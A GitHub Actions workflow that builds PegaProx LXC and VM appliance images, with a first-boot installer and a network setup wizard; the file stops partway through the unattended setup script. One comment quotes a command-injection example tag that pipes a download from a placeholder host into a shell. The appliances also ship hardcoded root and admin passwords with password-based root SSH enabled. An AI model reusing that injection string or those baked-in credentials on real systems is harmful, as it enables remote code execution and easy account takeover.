name: Build Release Appliances (VM + LXC)

on:
  release:
    types: [published]
  workflow_dispatch:
    inputs:
      tag:
        description: "Release-Tag (z. B. v0.9.11)"
        required: false
        default: ""

# NS Sep 2026 - only the publish job attaches assets to the release. Everything else
# just builds, so the token it gets does not need to be able to write to the repo.
permissions:
  contents: read

env:
  PVE_PORT: "5000"
  DEBIAN_RELEASE: "trixie"
  APT_POLL_RETRIES: "150"   # NS 2026-06-05 — gyptazy repo can lag; give it longer
  APT_POLL_INTERVAL: "30"

jobs:
  # ----------------------------------------------------------------------
  # 1) Version ermitteln + warten bis Release-Paket im gyptazy-Repo ist
  # ----------------------------------------------------------------------
  prepare:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.ver.outputs.version }}
      is_release: ${{ steps.ver.outputs.is_release }}
    steps:
      - id: ver
        name: Release-Version ermitteln
        # NS 2026-05-30 — release.tag_name and inputs.tag are user-controllable
        # by anyone with push/workflow_dispatch rights. Interpolating ${{ }}
        # inline into the shell `run:` block evaluates before quoting and lets
        # a tag like `'; curl evil | sh; #` escape into the script. Read them
        # via env vars so the shell quotes naturally.
        env:
          RELEASE_TAG_NAME: ${{ github.event.release.tag_name }}
          INPUT_TAG:        ${{ inputs.tag }}
        run: |
          if [ -n "$RELEASE_TAG_NAME" ]; then
            V="$RELEASE_TAG_NAME"
            REL="true"
          elif [ -n "$INPUT_TAG" ]; then
            V="$INPUT_TAG"
            REL="true"
          else
            V="dev-$(date +%Y%m%d-%H%M%S)"
            REL="false"
          fi
          # NS Sep 2026 - the env-var quoting above only protects THIS step. Once $V
          # is in GITHUB_OUTPUT the later steps read it back as a bare expression inside
          # their run blocks (the gyptazy poll below, and the artifact names in
          # build-lxc/build-vm), where a single quote in the tag breaks straight out of
          # the surrounding shell string. Cheaper to refuse a tag we would never cut
          # than to chase every sink: semver with an optional v, or our dev stamp.
          # And note what broke this file for a day: the expression braces are evaluated
          # inside a run block too, comment or not. Only a YAML-level comment is safe to
          # write them in - which is exactly what the note at the top of this step says,
          # and I wrote the example into the wrong kind of comment anyway.
          if ! printf '%s' "$V" | grep -qE '^(v?[0-9]+\.[0-9]+\.[0-9]+([.-][A-Za-z0-9]+)*(\+[A-Za-z0-9.-]+)?|dev-[0-9]{8}-[0-9]{6})$'; then
            echo "::error::refusing version '$V' - expected v1.2.3 / 1.2.3-rc1 or dev-YYYYMMDD-HHMMSS"
            exit 1
          fi
          echo "Version: $V (is_release=$REL)"
          echo "version=$V"      >> "$GITHUB_OUTPUT"
          echo "is_release=$REL" >> "$GITHUB_OUTPUT"

      - name: Tools
        if: steps.ver.outputs.is_release == 'true'
        run: |
          sudo apt-get update
          sudo apt-get install -y curl gnupg ca-certificates

      - name: Auf PegaProx-Paket im APT-Repo warten
        if: steps.ver.outputs.is_release == 'true'
        run: |
          set -e
          curl -fsSL https://git.gyptazy.com/api/packages/gyptazy/debian/repository.key \
            -o gyptazy.asc
          mkdir -p apt-root/etc/apt/sources.list.d \
                   apt-root/etc/apt/keyrings \
                   apt-root/var/lib/apt/lists/partial \
                   apt-root/var/cache/apt/archives/partial
          cp gyptazy.asc apt-root/etc/apt/keyrings/gyptazy.asc
          echo "deb [signed-by=$(pwd)/apt-root/etc/apt/keyrings/gyptazy.asc] https://packages.gyptazy.com/api/packages/gyptazy/debian ${DEBIAN_RELEASE} main" \
            > apt-root/etc/apt/sources.list.d/gyptazy.list

          WANT="$(echo '${{ steps.ver.outputs.version }}' | sed 's/^v//')"
          echo "Erwarte Paketversion (Präfix): $WANT"

          APT_OPTS="-o Dir::Etc::sourcelist=$(pwd)/apt-root/etc/apt/sources.list.d/gyptazy.list \
                    -o Dir::Etc::sourceparts=- \
                    -o Dir::Etc::trusted=$(pwd)/apt-root/etc/apt/keyrings/gyptazy.asc \
                    -o Dir::State::lists=$(pwd)/apt-root/var/lib/apt/lists \
                    -o Dir::Cache=$(pwd)/apt-root/var/cache/apt"

          FOUND=""
          for i in $(seq 1 "${APT_POLL_RETRIES}"); do
            apt-get $APT_OPTS update >/dev/null 2>&1 || true
            CAND="$(apt-cache $APT_OPTS madison pegaprox 2>/dev/null | awk '{print $3}' || true)"
            MATCH="$(echo "$CAND" | grep -E "^${WANT}([.+~-]|$)" | head -n1 || true)"
            if [ -n "$MATCH" ]; then
              FOUND="$MATCH"
              echo "Gefunden: pegaprox=$FOUND"
              break
            fi
            echo "[$i/${APT_POLL_RETRIES}] Paket $WANT noch nicht im Repo, warte ${APT_POLL_INTERVAL}s..."
            sleep "${APT_POLL_INTERVAL}"
          done

          if [ -z "$FOUND" ]; then
            echo "::error::Paket für $WANT ist nach dem Timeout nicht im gyptazy-Repo aufgetaucht."
            exit 1
          fi
          echo "Release-Paket ist verfügbar, Build kann starten."

      - name: Dev-Build - Poll übersprungen
        if: steps.ver.outputs.is_release != 'true'
        run: |
          echo "Manueller Dev-Build ohne Tag ('${{ steps.ver.outputs.version }}')."
          echo "Repo-Poll wird übersprungen. Es wird die aktuell neueste pegaprox-Version installiert."

  # ----------------------------------------------------------------------
  # 2) LXC-Template per distrobuilder (Snap) + Smoke-Test
  # ----------------------------------------------------------------------
  build-lxc:
    needs: prepare
    # NS Oct 2026 - ubuntu-latest moved to 26.04, where qemu-user-static is only a virtual
    # package and apt refuses to pick a provider. 1.4.0 built here on 24.04; stay on it until
    # the tools step is ported.
    runs-on: ubuntu-24.04
    # NS Aug 2026 — arm64 builds under qemu emulation and is flaky; a failed arm64 leg must NOT
    # block the amd64 release. publish attaches whatever artifacts exist (glob), so a missing
    # arm64 asset is fine; amd64 has no continue-on-error, so a real amd64 failure still blocks.
    continue-on-error: ${{ matrix.arch == 'arm64' }}
    strategy:
      fail-fast: false
      matrix:
        arch: [amd64, arm64]
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1
        with:
          # NS Sep 2026 (audit) - build-vm has had this since its own review; this job
          # was left writing the job token into .git/config for every later step.
          persist-credentials: false

      # Registers the kernel-level emulators used both by distrobuilder and by
      # the arm64 LXC smoke-test container.
      # NS Oct 2026 (#982) - the binfmt image by digest, like the docker workflows
      - name: QEMU einrichten
        uses: docker/setup-qemu-action@c7c53464625b32c7a7e944ae62b3e17d2b600130 # v3.7.0
        with:
          image: docker.io/tonistiigi/binfmt:qemu-v10.2.3@sha256:400a4873b838d1b89194d982c45e5fb3cda4593fbfd7e08a02e76b03b21166f0

      - name: Tools installieren
        run: |
          sudo apt-get update
          # python3-pip for the wheel download of build-sqlcipher3-deb.sh, dpkg-deb is there anyway
          sudo apt-get install -y \
            debootstrap rsync systemd-container curl xz-utils qemu-user-static binfmt-support python3-pip
          sudo update-binfmts --enable qemu-aarch64 || true
          sudo snap install distrobuilder --classic
          export PATH="$PATH:/snap/bin"
          distrobuilder --version

      # NS Nov 2026 (#1226) - python3-sqlcipher3 is a C extension, one package per architecture.
      # Built for this leg from the wheels apt.pegaprox.com pins, with its script; the files
      # section of the definition copies it into the rootfs.
      - name: python3-sqlcipher3 bauen
        run: bash packaging/apt/build-sqlcipher3-deb.sh "${{ matrix.arch }}" "$RUNNER_TEMP/sqlcipher3-deb"

      - name: distrobuilder-Definition schreiben
        run: |
          mkdir -p packaging/lxc
          cat > packaging/lxc/pegaprox-lxc.yaml <<YAML
          image:
            distribution: debian
            release: ${DEBIAN_RELEASE}
            description: PegaProx LXC Appliance
            architecture: ${{ matrix.arch }}

          source:
            downloader: debootstrap
            url: http://deb.debian.org/debian
            keyserver: keyserver.ubuntu.com

          targets:
            lxc:
              create_message: |
                PegaProx Appliance - Login: root / PegaProx2026!
              config:
                - type: all
                  before: 5
                  content: |-
                    lxc.include = LXC_TEMPLATE_CONFIG/common.conf
                - type: all
                  after: 4
                  content: |-
                    lxc.include = LXC_TEMPLATE_CONFIG/userns.conf
                - type: all
                  content: |-
                    lxc.arch = ${{ matrix.arch == 'amd64' && 'x86_64' || 'aarch64' }}

          packages:
            manager: apt
            update: true
            cleanup: true
            sets:
              - packages:
                  - python3
                  - python3-pip
                  - curl
                  - ca-certificates
                  - gnupg
                  - sudo
                  - sqlite3
                  - systemd
                  - systemd-sysv
                action: install

          files:
            # the python3-sqlcipher3 of the step before. distrobuilder copies files after
            # post-packages, so the install below runs at post-files, with it in place
            - generator: copy
              source: ${RUNNER_TEMP}/sqlcipher3-deb/python3-sqlcipher3.deb
              path: /var/cache/pegaprox-image/python3-sqlcipher3.deb

          actions:
            - trigger: post-files
              action: |-
                #!/bin/sh
                set -eu
                apt-get update
                apt-get -y install wget
                # NS Sep 2026 (audit) - these two came off the CDN unverified and were
                # installed as root into the appliance. Pin the bytes.
                #
                # The better fix would be apt from gyptazy's SIGNED repo, which the next
                # lines configure - but it currently carries python3-flask-sock 0.7.0-1
                # and python3-xenapi 26.8.0, i.e. OLDER than what we ship. Installing from
                # there would quietly downgrade the appliance, so the checksum stands in
                # until those versions land in the repo. Checked 2026-09-22.
                #
                # Being honest about what this is: the hashes were taken from the CDN, so
                # this is trust-on-first-use. It proves the bytes have not changed since;
                # it does not prove they were ever right. When the build breaks here,
                # that is the check working - confirm the new artifact before bumping.
                wget https://cdn.gyptazy.com/debian/python3-flask-sock/python3-flask-sock_0.7.1_all.deb
                wget https://cdn.gyptazy.com/debian/python3-xenapi/python3-xenapi_26.8.1_all.deb
                cat > /tmp/deb.sha256 <<'SUMS'
                125ec5a4e2bbc10c57b7b9e3ab05aecda5edf1b8f6646aff4131cab441b53c24  python3-flask-sock_0.7.1_all.deb
                db36397c5db4448459dee349fc2a0b6f147ddf4b346dc8480687903c38fc822e  python3-xenapi_26.8.1_all.deb
                SUMS
                sed -i 's/^[[:space:]]*//' /tmp/deb.sha256
                sha256sum -c /tmp/deb.sha256
                dpkg -i python3-flask-sock_0.7.1_all.deb
                dpkg -i python3-xenapi_26.8.1_all.deb
                # NS Nov 2026 (#1226) - ahead of pegaprox, which depends on it. Not the one on
                # the CDN: that one says Architecture all and holds the x86_64 module only
                dpkg -i /var/cache/pegaprox-image/python3-sqlcipher3.deb
                rm -rf /var/cache/pegaprox-image
                install -d -m 0755 /etc/apt/keyrings
                curl -fsSL https://git.gyptazy.com/api/packages/gyptazy/debian/repository.key \\
                  -o /etc/apt/keyrings/gyptazy.asc
                echo "deb [signed-by=/etc/apt/keyrings/gyptazy.asc] https://packages.gyptazy.com/api/packages/gyptazy/debian ${DEBIAN_RELEASE} main" \\
                  > /etc/apt/sources.list.d/gyptazy.list
                apt-get update
                # NS Aug 2026 (#688) — sshpass: PegaProx falls back to it for password-auth SSH
                # (CVE scan et al.); the prebuilt image must ship it or that path dies with
                # "sshpass not installed". Key auth works without it, but the appliance supports both.
                apt-get -y install pegaprox sshpass
                systemctl enable pegaprox || true
                # --- Root-Login setzen ---
                echo 'root:PegaProx2026!' | chpasswd

          mappings:
            architecture_map: debian
          YAML

      - name: rootfs bauen
        run: |
          export PATH="$PATH:/snap/bin"
          sudo --preserve-env=PATH "$(command -v distrobuilder)" \
            build-lxc packaging/lxc/pegaprox-lxc.yaml \
            -o image.release=${DEBIAN_RELEASE} \
            -o image.architecture=${{ matrix.arch }}
          ls -lh *.tar.xz

      - name: Smoke-Test (Container starten + HTTP-Check)
        run: |
          set -e
          if [ "${{ matrix.arch }}" = "amd64" ]; then
            mkdir -p /tmp/ct/rootfs
            sudo tar -xpJf rootfs.tar.xz -C /tmp/ct/rootfs
            sudo systemd-nspawn -D /tmp/ct/rootfs \
              --machine pegaprox-test \
              --boot \
              --bind-ro=/etc/resolv.conf \
              > /tmp/nspawn.log 2>&1 &
            NSPAWN_PID=$!
          else
            sudo docker import --platform linux/arm64 rootfs.tar.xz pegaprox-lxc-smoke:arm64
            sudo docker run -d \
              --name pegaprox-test \
              --platform linux/arm64 \
              --privileged \
              -p ${PVE_PORT}:${PVE_PORT} \
              --entrypoint /bin/sh \
              pegaprox-lxc-smoke:arm64 \
              -c '
                set -e
                chmod +x /usr/bin/pegaprox/pegaprox-wrapper
                ls -al /usr/bin/pegaprox
                exec /usr/bin/pegaprox/pegaprox-wrapper
              '
          fi

          echo "Warte auf PegaProx auf Port ${PVE_PORT}..."
          OK=0
          for i in $(seq 1 36); do
            if curl -kfs "https://localhost:${PVE_PORT}/" >/dev/null 2>&1 \
               || curl -fs "http://localhost:${PVE_PORT}/" >/dev/null 2>&1; then
              OK=1; break
            fi
            sleep 5
          done

          if [ "${{ matrix.arch }}" = "amd64" ]; then
            echo "----- Letzte Zeilen des Container-Logs -----"
            tail -n 40 /tmp/nspawn.log || true
            echo "----- Lauschende Ports auf dem Host -----"
            sudo ss -tlnp || true
            sudo machinectl poweroff pegaprox-test 2>/dev/null || true
            sleep 3
            sudo machinectl terminate pegaprox-test 2>/dev/null || true
            # NS Nov 2026 (#1226) - what PegaProx says about its database, as the service user
            # in its directory. A second nspawn on the tree once the booted one has let go of it
            for _ in $(seq 1 30); do ps -p "$NSPAWN_PID" >/dev/null || break; sleep 1; done
            timeout 120 sudo systemd-nspawn -D /tmp/ct/rootfs --quiet --pipe --register=no \
              --user=pegaprox --chdir=/var/lib/pegaprox \
              /usr/bin/pegaprox/pegaprox-wrapper --keystore-status > "$RUNNER_TEMP/keystore-status.json" || true
          else
            # the same in the running container (under qemu, so with time to spare)
            timeout 300 sudo docker exec -u pegaprox -w /var/lib/pegaprox pegaprox-test \
              /usr/bin/pegaprox/pegaprox-wrapper --keystore-status > "$RUNNER_TEMP/keystore-status.json" || true
            echo "----- Container-Logs -----"
            sudo docker logs pegaprox-test || true
            sudo docker rm -f pegaprox-test 2>/dev/null || true
          fi
          echo "----- --keystore-status -----"
          cat "$RUNNER_TEMP/keystore-status.json" || true

          [ "$OK" -eq 1 ] || { echo "::error::PegaProx kam im LXC nicht hoch"; exit 1; }
          # port 5000 answers on plain SQLite too. On arm64 this fails the leg, and with it the
          # upload of its template (continue-on-error: the amd64 release goes out without it)
          python3 -I packaging/apt/smoke_backend.py "$RUNNER_TEMP/keystore-status.json"
          echo "LXC Smoke-Test erfolgreich."

      - name: Template umbenennen
        run: |
          mv rootfs.tar.xz \
            "pegaprox-${{ needs.prepare.outputs.version }}-lxc-${{ matrix.arch }}.tar.xz"
          # NS 2026-06-05 — also ship a stable -latest- name so the GitHub
          # releases/latest/download/ URL always resolves to the newest LXC
          # template (same as Docker's :latest). Byte-identical copy.
          cp "pegaprox-${{ needs.prepare.outputs.version }}-lxc-${{ matrix.arch }}.tar.xz" \
             "pegaprox-latest-lxc-${{ matrix.arch }}.tar.xz"

      - name: Artefakt sichern
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
        with:
          name: lxc-template-${{ matrix.arch }}
          path: pegaprox-*lxc*.tar.xz
          retention-days: 7

  # ----------------------------------------------------------------------
  # 3) VM-Image: apt-Paket-Install + Wizard beim First Boot / Login
  # ----------------------------------------------------------------------
  build-vm:
    needs: prepare
    runs-on: ubuntu-latest
    # NS Aug 2026 — see build-lxc: keep the emulated arm64 leg from blocking the amd64 release.
    continue-on-error: ${{ matrix.arch == 'arm64' }}
    strategy:
      fail-fast: false
      matrix:
        arch: [amd64, arm64]
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1
        with:
          persist-credentials: false

      - name: Tools installieren
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            qemu-utils qemu-system-x86 qemu-system-arm qemu-efi-aarch64 \
            cloud-image-utils curl python3-pip

      # NS Nov 2026 (#1226) - as in build-lxc; the first-boot installer takes it from the image
      - name: python3-sqlcipher3 bauen
        run: bash packaging/apt/build-sqlcipher3-deb.sh "${{ matrix.arch }}" "$RUNNER_TEMP/sqlcipher3-deb"

      - name: Debian Cloud-Image laden + Checksum verifizieren
        run: |
          # NS 2026-05-30 — the image we pull here becomes the rootfs of every
          # published PegaProx VM appliance. Downloading over plain HTTPS without
          # verifying the bytes against the published checksum leaves a
          # supply-chain hole: a compromised mirror or a MITM with a forged cert
          # could substitute a backdoored qcow2 and every release artefact would
          # carry it. Fix: pull SHA512SUMS from the same path Debian publishes
          # alongside the image and fail the build if the hash doesn't match.
          set -euo pipefail
          BASE_URL="https://cloud.debian.org/images/cloud/${DEBIAN_RELEASE}/latest"
          IMG_NAME="debian-13-genericcloud-${{ matrix.arch }}.qcow2"

          wget -q -O pegaprox.qcow2 "${BASE_URL}/${IMG_NAME}"
          wget -q -O SHA512SUMS     "${BASE_URL}/SHA512SUMS"

          # SHA512SUMS lists every asset Debian ships at this path. Pull the
          # row for our image, swap the original filename for the local name
          # we saved under, then let sha512sum do the actual comparison.
          # Failing here aborts the build before the image ever touches the
          # next step, which is exactly what we want.
          EXPECTED_LINE=$(grep "[ \t*]${IMG_NAME}\$" SHA512SUMS || true)
          if [ -z "${EXPECTED_LINE}" ]; then
            echo "::error::SHA512SUMS does not contain a line for ${IMG_NAME}"
            echo "::error::SHA512SUMS contents:"
            cat SHA512SUMS
            exit 1
          fi
          echo "${EXPECTED_LINE}" | sed "s| [ *]${IMG_NAME}\$|  pegaprox.qcow2|" > pegaprox.qcow2.sha512
          sha512sum -c pegaprox.qcow2.sha512

          qemu-img resize pegaprox.qcow2 20G

      - name: Dateien per qemu-nbd einhängen
        run: |
          set -e

          # --- gyptazy-Repo-Key + Sourceliste ---
          curl -fsSL https://git.gyptazy.com/api/packages/gyptazy/debian/repository.key \
            -o gyptazy.asc

          cat > gyptazy.list <<GYPTLIST
          deb [signed-by=/etc/apt/keyrings/gyptazy.asc] https://packages.gyptazy.com/api/packages/gyptazy/debian ${DEBIAN_RELEASE} main
          GYPTLIST

          # ==================================================================
          # First-Boot-Installer: apt-Paket + User + SSH
          # ==================================================================
          cat > install-pegaprox.sh <<'INSTALLEOF'
          #!/bin/sh
          set -eu
          export DEBIAN_FRONTEND=noninteractive

          # --- Basis-Tools + PegaProx ---
          apt-get update
          # NS Sep 2026 (audit) - same two unverified CDN packages as the LXC job; see
          # the note there for why the signed gyptazy repo cannot carry them yet.
          wget https://cdn.gyptazy.com/debian/python3-flask-sock/python3-flask-sock_0.7.1_all.deb
          wget https://cdn.gyptazy.com/debian/python3-xenapi/python3-xenapi_26.8.1_all.deb
          cat > /tmp/deb.sha256 <<'SUMS'
          125ec5a4e2bbc10c57b7b9e3ab05aecda5edf1b8f6646aff4131cab441b53c24  python3-flask-sock_0.7.1_all.deb
          db36397c5db4448459dee349fc2a0b6f147ddf4b346dc8480687903c38fc822e  python3-xenapi_26.8.1_all.deb
          SUMS
          sed -i 's/^[[:space:]]*//' /tmp/deb.sha256
          sha256sum -c /tmp/deb.sha256
          dpkg -i python3-flask-sock_0.7.1_all.deb
          dpkg -i python3-xenapi_26.8.1_all.deb
          # NS Nov 2026 (#1226) - the python3-sqlcipher3 the workflow built for this arch, ahead
          # of pegaprox: apt would take the Architecture all one of the third-party repo, which
          # holds the x86_64 module only
          dpkg -i /var/cache/pegaprox-image/python3-sqlcipher3.deb
          rm -f /var/cache/pegaprox-image/python3-sqlcipher3.deb
          apt-get -y install sudo sqlite3 ca-certificates curl qemu-guest-agent
          apt-get -y install pegaprox sshpass
          systemctl enable pegaprox || true
          # what PegaProx says about its database; the workflow checks it after this boot
          (cd /var/lib/pegaprox && runuser -u pegaprox -- /usr/bin/pegaprox/pegaprox-wrapper --keystore-status) \
            > /var/cache/pegaprox-image/keystore-status.json || true

          # --- Login-User mit sudo ---
          if ! id pegaprox_admin >/dev/null 2>&1; then
            useradd -m -s /bin/bash pegaprox_admin
          fi
          usermod -aG sudo pegaprox_admin || true
          echo 'pegaprox_admin:PegaProx2026!' | chpasswd
          echo 'root:7eF9$&JHVspAmjWKcGmD!6QypzBsbmyA' | chpasswd

          # --- SSH: Passwort-Login erlauben ---
          mkdir -p /etc/ssh/sshd_config.d
          printf 'PasswordAuthentication yes\nKbdInteractiveAuthentication yes\nPermitRootLogin yes\n' \
            > /etc/ssh/sshd_config.d/99-pegaprox.conf
          systemctl reload ssh 2>/dev/null \
            || systemctl restart ssh 2>/dev/null \
            || systemctl restart sshd 2>/dev/null || true

          mkdir -p /etc/pegaprox
          systemctl disable pegaprox-firstboot.service || true
          INSTALLEOF

          cat > pegaprox-firstboot.service <<'SVCEOF'
          [Unit]
          Description=PegaProx First Boot Installer
          After=network-online.target
          Wants=network-online.target
          ConditionPathExists=/usr/local/sbin/install-pegaprox.sh

          [Service]
          Type=oneshot
          ExecStart=/usr/local/sbin/install-pegaprox.sh
          RemainAfterExit=yes

          [Install]
          WantedBy=multi-user.target
          SVCEOF

          # ==================================================================
          # Interaktiver Setup-Wizard (systemd-networkd, heredoc-frei)
          # User-sichtbare Texte: ENGLISCH
          # ==================================================================
          cat > pegaprox-setup <<'WIZ'
          #!/bin/bash
          # PegaProx First-Boot Wizard (interactive)
          MARKER="/etc/pegaprox/.setup-complete"
          C='\033[0;36m'; G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; N='\033[0m'

          detect_interface() {
            local raw
            raw=$(ip -o link show | awk -F': ' '{print $2}' | grep -v '^lo$' | head -n1)
            echo "${raw%%@*}"
          }
          get_current_ip() {
            ip -4 addr show "$1" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n1
          }
          validate_ip() {
            [[ $1 =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]] || return 1
            local i; IFS='.' read -ra A <<< "$1"
            for i in "${A[@]}"; do [ "$i" -le 255 ] || return 1; done
          }
          mask_to_cidr() {
            case "$1" in
              255.255.255.0) echo 24;; 255.255.254.0) echo 23;; 255.255.252.0) echo 22;;
              255.255.248.0) echo 21;; 255.255.240.0) echo 20;; 255.255.0.0) echo 16;;
              255.0.0.0) echo 8;; *) echo "";;
            esac
          }
          parse_subnet() {
            local in="$1"
            [[ $in =~ ^[0-9]+$ ]] && [ "$in" -ge 0 ] && [ "$in" -le 32 ] && { echo "$in"; return; }
            local c; c=$(mask_to_cidr "$in"); [ -n "$c" ] && echo "$c"
          }
          # MK Nov 2026 - systemd-resolved hands a short name (esx01) to the DNS servers only with
          # a search domain on the link itself; one set only in resolved.conf is not appended there
          valid_domains() {
            local d
            for d in $1; do
              [[ $d =~ ^[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?(\.[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?)*$ ]] || return 1
            done
          }
          ask_domains() {
            while true; do
              read -p "Search domain, optional (e.g. example.lan): " DOMAINS
              valid_domains "$DOMAINS" && break; echo -e "${R}Invalid domain${N}"
            done
          }
          # NS Nov 2026 - through PegaProx itself, as its user in its directory: the sqlite3 CLI
          # cannot open the SQLCipher database the appliance has
          set_port() {
            (cd /var/lib/pegaprox && runuser -u pegaprox -- /usr/bin/pegaprox/pegaprox-wrapper --set-port "$1")
          }

          [ "$EUID" -ne 0 ] && { echo -e "${R}Please run as root: sudo pegaprox-setup${N}"; exit 1; }
          mkdir -p /etc/pegaprox

          if [ -f "$MARKER" ] && [ "${1:-}" != "--force" ] && [ "${1:-}" != "-f" ]; then
            IFACE=$(detect_interface)
            echo -e "${G}PegaProx is already configured.${N}"
            echo -e "Access: ${C}https://$(get_current_ip "$IFACE"):5000${N}"
            echo -e "Reconfigure: ${Y}sudo pegaprox-setup --force${N}"
            exit 0
          fi
          if [ "${1:-}" = "--force" ] || [ "${1:-}" = "-f" ]; then rm -f "$MARKER"; fi

          clear
          echo -e "${C}===============================================${N}"
          echo -e "${C}      PegaProx First-Boot Configuration${N}"
          echo -e "${C}===============================================${N}"
          echo ""
          echo -e "${Y}This wizard configures the network and starts PegaProx.${N}"
          read -p "Press ENTER to continue..." _

          ACCESS_PORT=5000
          IFACE=$(detect_interface); IFACE="${IFACE:-eth0}"
          echo ""
          echo -e "Detected interface: ${C}$IFACE${N}"
          CUR=$(get_current_ip "$IFACE"); [ -n "$CUR" ] && echo -e "Current IP: ${C}$CUR${N}"
          echo ""
          echo "1) Static IP (recommended)"
          echo "2) DHCP"
          USE_DHCP=false
          while true; do
            read -p "Selection [1/2]: " ch
            case "$ch" in 1) USE_DHCP=false; break;; 2) USE_DHCP=true; break;; esac
          done

          if [ "$USE_DHCP" = false ]; then
            while true; do read -p "IP address (e.g. 192.168.1.50): " IP_ADDR; validate_ip "$IP_ADDR" && break; echo -e "${R}Invalid IP${N}"; done
            while true; do read -p "Subnet (24 or 255.255.255.0): " SIN; SUBNET=$(parse_subnet "$SIN"); [ -n "$SUBNET" ] && break; echo -e "${R}Invalid subnet${N}"; done
            while true; do read -p "Gateway (e.g. 192.168.1.1): " GATEWAY; validate_ip "$GATEWAY" && break; echo -e "${R}Invalid gateway${N}"; done
            while true; do read -p "DNS (e.g. 8.8.8.8 1.1.1.1): " DNS; validate_ip "$(echo $DNS | awk '{print $1}')" && break; echo -e "${R}Invalid DNS${N}"; done
            ask_domains
            echo -e "${Y}Summary:${N} $IFACE  $IP_ADDR/$SUBNET  gw $GATEWAY  dns $DNS${DOMAINS:+  search $DOMAINS}"
            read -p "Correct? [Y/n]: " ok
            case "$ok" in [Nn]*) echo "Aborted."; exit 1;; esac
          else
            ask_domains
          fi

          echo ""
          echo "Port configuration:"
          echo "  1) Default (5000/5001/5002)"
          echo "  2) HTTPS   (443/444/445)"
          echo "  3) Custom base port"
          while true; do
            read -p "Selection [1/2/3]: " p
            case "$p" in
              1) ACCESS_PORT=5000; break;;
              2) ACCESS_PORT=443; break;;
              3) read -p "Base port (1-65535): " cp
                 if [[ "$cp" =~ ^[0-9]+$ ]] && [ "$cp" -ge 1 ] && [ "$cp" -le 65535 ]; then ACCESS_PORT=$cp; break; fi;;
            esac
          done

          echo ""
          echo -e "${C}Applying network configuration...${N}"
          mkdir -p /etc/cloud/cloud.cfg.d
          echo 'network: {config: disabled}' > /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg
          mkdir -p /etc/systemd/network
          rm -f /etc/systemd/network/*.network 2>/dev/null || true

          # /etc/resolv.conf is the stub of systemd-resolved, which takes DNS= and Domains=
          # from this file; anything written into resolv.conf itself was gone within seconds
          if [ "$USE_DHCP" = true ]; then
            { printf '[Match]\nName=%s\n\n[Network]\nDHCP=yes\n' "$IFACE"
              if [ -n "$DOMAINS" ]; then printf 'Domains=%s\n' "$DOMAINS"; fi
            } > /etc/systemd/network/10-pegaprox.network
          else
            { printf '[Match]\nName=%s\n\n[Network]\nAddress=%s/%s\nGateway=%s\n' "$IFACE" "$IP_ADDR" "$SUBNET" "$GATEWAY"
              for d in $DNS; do printf 'DNS=%s\n' "$d"; done
              if [ -n "$DOMAINS" ]; then printf 'Domains=%s\n' "$DOMAINS"; fi
            } > /etc/systemd/network/10-pegaprox.network
          fi
          systemctl disable networking 2>/dev/null || true
          systemctl enable systemd-networkd 2>/dev/null || true

          echo -e "${R}Network will be restarted - your SSH session may drop.${N}"
          [ "$USE_DHCP" = false ] && echo -e "New IP: ${C}$IP_ADDR${N}"
          read -p "Press ENTER to apply..." _
          systemctl restart systemd-networkd 2>/dev/null || true
          sleep 3

          systemctl daemon-reload
          systemctl enable pegaprox 2>/dev/null || true
          systemctl restart pegaprox 2>/dev/null || systemctl start pegaprox 2>/dev/null || true
          echo "Waiting for database initialization..."
          sleep 8

          if [ "$ACCESS_PORT" != 5000 ]; then
            if set_port "$ACCESS_PORT"; then
              systemctl restart pegaprox 2>/dev/null || true; sleep 4
              echo -e "${G}Port set to $ACCESS_PORT${N}"
            else
              echo -e "${Y}Could not set port automatically - please set it under Settings > Server.${N}"
            fi
          fi

          systemctl is-active --quiet pegaprox \
            && echo -e "${G}PegaProx is running.${N}" \
            || echo -e "${R}PegaProx failed to start - check: journalctl -u pegaprox${N}"

          echo ""
          echo -e "${Y}Set a password for the login user 'pegaprox_admin':${N}"
          read -p "Set it now? [Y/n]: " sp
          case "${sp:-y}" in
            [Nn]*) echo -e "${Y}Later with: passwd pegaprox_admin${N}";;
            *) passwd pegaprox_admin || echo -e "${Y}Password change skipped.${N}";;
          esac

          mkdir -p /etc/pegaprox
          touch "$MARKER"
          FIP=$(get_current_ip "$IFACE")
          echo ""
          echo -e "${G}Setup complete!${N}"
          if [ -n "$FIP" ]; then
            if [ "$ACCESS_PORT" = 443 ]; then echo -e "  Web: ${C}https://$FIP${N}"; else echo -e "  Web: ${C}https://$FIP:$ACCESS_PORT${N}"; fi
          else
            echo -e "  Web: ${C}https://<ip>:$ACCESS_PORT${N}"
          fi
          WIZ

          # ==================================================================
          # Unattended Setup (cloud-init) - user-sichtbare Logs: ENGLISCH
          # ==================================================================
          cat > pegaprox-setup-auto <<'AUTO'
          #!/bin/bash
          set -e
          MARKER="/etc/pegaprox/.setup-complete"
          IP="${PEGAPROX_IP:-}"; CIDR="${PEGAPROX_CIDR:-24}"; GW="${PEGAPROX_GW:-}"
          DNS="${PEGAPROX_DNS:-8.8.8.8 8.8.4.4}"; DHCP="${PEGAPROX_DHCP:-false}"
          FORCE="${PEGAPROX_FORCE:-false}"; IFACE="${PEGAPROX_IFACE:-}"; PORT="${PEGAPROX_PORT:-5000}"
          DOMAINS="${PEGAPROX_DOMAIN:-}"

          log(){ echo "[$(date '+%H:%M:%S')] $1"; }
          mask_to_cidr(){ case "$1" in 255.255.255.0) echo 24;; 255.255.254.0) echo 23;; 255.255.252.0) echo 22;; 255.255.248.0) echo 21;; 255.255.240.0) echo 20;; 255.255.0.0) echo 16;; 255.0.0.0) echo 8;; *) echo "";; esac; }
          # the sqlite3 CLI cannot open the SQLCipher database (see pegaprox-setup)
          set_port(){ (cd /var/lib/pegaprox && runuser -u pegaprox -- /usr/bin/pegaprox/pegaprox-wrapper --set-port "$1"); }

